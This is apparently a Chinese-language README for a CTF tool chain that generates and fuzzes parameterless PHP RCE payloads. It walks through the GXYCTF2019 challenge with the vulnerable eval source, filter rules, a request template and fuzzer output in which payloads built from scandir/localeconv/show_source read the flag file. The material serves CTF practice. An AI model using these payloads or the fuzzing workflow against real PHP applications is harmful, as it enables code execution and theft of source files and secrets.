# CTF 无参RCE自动化工具链

一个专为CTF竞赛设计的自动化工具链，专注于解决"无参数RCE"(Parameterless Remote Code Execution)类题目。通过动静结合的智能分析，自动生成有效Payload并验证漏洞利用。

## 使用前提

- Python 3.8+
- PHP 7.4+

## 快速开始

### 1. 克隆仓库

```bash
git clone https://github.com/yourusername/ctf-parameterless-rce-toolchain.git
cd ctf-parameterless-rce-toolchain
```

### 2. 准备必要文件

```bash
# 配置过滤条件（根据题目要求）
vim 过滤条件.txt

# 创建请求模板（复制粘贴目标HTTP请求）
vim request.txt
```

### 3. 运行工具链

```bash
# 生成有效Payload
php filter.php

# 编辑配置文件
vim config.json

# 启动Fuzz攻击
python3 fuzz_Parameterless_RCE.py
```

### 4. 查看结果

成功利用的响应将保存在`result/`目录中：

## 详细配置说明

### config.json 配置指南

```json
{
  "key_words": [                                // flag关键词
    "flag{",
    "CTF{"
  ],
  "http_method": "GET",                         // 请求方法：GET/POST
  "param": "exp",                               // 目标参数名
  "payload_dir": "payload_202309141830.txt",    // 筛选生成的Payload文件路径
  "Request_Packet_dir": "request.txt"           // 请求包文件路径
}
```

### 过滤条件文件格式 (`过滤条件.txt`)

示例过滤规则：

```php
if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp']))
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))
if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp']))
```

## 项目结构

```
.
├── filter.php                     # Payload过滤引擎（PHP）
├── fuzz_Parameterless_RCE.py      # HTTP Fuzzer主程序（Python）
├── config.json                    # 主配置文件
├── 无参RCE_payload.txt             # Payload字典
├── 过滤条件.txt                    # 过滤规则示例文件
├── request.txt                    # HTTP请求包模板
├── result/                        # 结果保存目录
│   └── success_202309141832.html  # 成功响应示例
└── README.md                      # 本文档
```

## 完整使用示例

以 **[GXYCTF2019]禁止套娃** 题目为例

### 场景描述

`githack` 获取源码

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

### 步骤1：设置过滤条件 (`过滤条件.txt`)

```php
if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp']))
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))
if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp']))
```

### 步骤2：生成有效Payload

```bash
php filter.php
```

输出：`payload_202509141845.txt`

### 步骤3：准备请求文件 (`request.txt`)

```http
GET /?exp=123 HTTP/1.1
Host: fd75f2a1-ccbf-4d75-a01d-5b530c12da71.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### 步骤4：配置`config.json`

```json
{
  "key_words": [
    "flag{",
    "ctf{"
  ],
  "http_method": "GET",
  "param": "exp",
  "payload_dir": "./payload_202509141845.txt",
  "Request_Packet_dir": "./request.txt"
}
```

### 步骤5：执行Fuzz攻击

```bash
python .\fuzz_Parameterless_RCE.py .\config.json
```

输出：

```
==================================================
处理非随机Payloads
==================================================

Payload: print_r(scandir(current(localeconv())));
URL: http://13fe76f2-b104-49db-9997-ec4c3d878d23.node5.buuoj.cn:81/?exp=print_r%28scandir%28current%28localeconv%28%29%29%29%29%3B
    状态: 200
    大小: 117字节

Payload: show_source(next(array_reverse(scandir(pos(localeconv())))));
URL: http://13fe76f2-b104-49db-9997-ec4c3d878d23.node5.buuoj.cn:81/?exp=show_source%28next%28array_reverse%28scandir%28pos%28localeconv%28%29%29%29%29%29%29%3B
    状态: 200
    大小: 352字节
    发现关键词! 响应已保存到: result/1757847380_show_sourc.html


==================================================
处理随机特性Payloads（爆破）
==================================================

Payload: show_source(array_rand(array_flip(scandir(current(localeconv())))));
URL: http://13fe76f2-b104-49db-9997-ec4c3d878d23.node5.buuoj.cn:81/?exp=show_source%28array_rand%28array_flip%28scandir%28current%28localeconv%28%29%29%29%29%29%29%3B
    检测到随机Payload，执行爆破
    [1/10] 发送请求...
        状态: 200, 大小: 352字节
        发现关键词! 响应已保存到: result/1757847381_show_sourc_blast_1.html
    [2/10] 发送请求...
        状态: 200, 大小: 23字节
    [3/10] 发送请求...
        状态: 200, 大小: 23字节
    [4/10] 发送请求...
        状态: 200, 大小: 23字节
    [5/10] 发送请求...
        状态: 200, 大小: 23字节
    [6/10] 发送请求...
        状态: 200, 大小: 23字节
    [7/10] 发送请求...
        状态: 200, 大小: 352字节
        发现关键词! 响应已保存到: result/1757847382_show_sourc_blast_7.html
    [8/10] 发送请求...
        状态: 200, 大小: 352字节
        发现关键词! 响应已保存到: result/1757847383_show_sourc_blast_8.html
    [9/10] 发送请求...
        状态: 200, 大小: 352字节
        发现关键词! 响应已保存到: result/1757847383_show_sourc_blast_9.html
    [10/10] 发送请求...
        状态: 200, 大小: 23字节
    爆破完成: 4次命中关键词
    保存的文件: result/1757847381_show_sourc_blast_1.html, result/1757847382_show_sourc_blast_7.html, result/1757847383_show_sourc_blast_8.html, result/1757847383_show_sourc_blast_9.html
```

### 步骤6：获取Flag

查看 `result/` 目录内容：

```html
$flag = "flag{c9771324-3a34-48a3-9a58-4ddfadf67a97}";
```

## 贡献与改进

欢迎贡献您的想法和代码！以下是计划中的改进方向：

1. **Payload字典扩展**：添加更多无参RCE技术
2. **智能结果分析**：自动提取flag并标记
3. **分布式Fuzzing**：支持多节点并行测试
